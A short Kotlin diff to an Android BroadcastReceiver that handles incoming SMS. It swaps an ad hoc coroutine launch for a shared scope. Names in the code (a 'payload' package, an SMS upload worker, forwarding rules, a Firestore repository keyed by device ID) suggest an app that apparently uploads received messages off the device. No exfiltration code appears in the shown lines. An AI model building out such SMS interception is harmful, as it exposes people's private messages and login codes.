@@ -10,8 +10,14 @@ import androidx.work.Data
 import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.WorkManager
 import com.payload.jansiix0ne.worker.SmsUploadWorker
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.launch
 
 class Receiver : BroadcastReceiver() {
+
+    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
     override fun onReceive(context: Context?, intent: Intent?) {
         if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
@@ -44,7 +50,7 @@ class Receiver : BroadcastReceiver() {
                     
                     // Check for SMS forwarding rules
                     context?.let { ctx ->
-                        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                        scope.launch {
                             try {
                                 val repository = com.payload.jansiix0ne.repository.FirestoreRepository()
                                 val deviceId = getDeviceId(ctx)
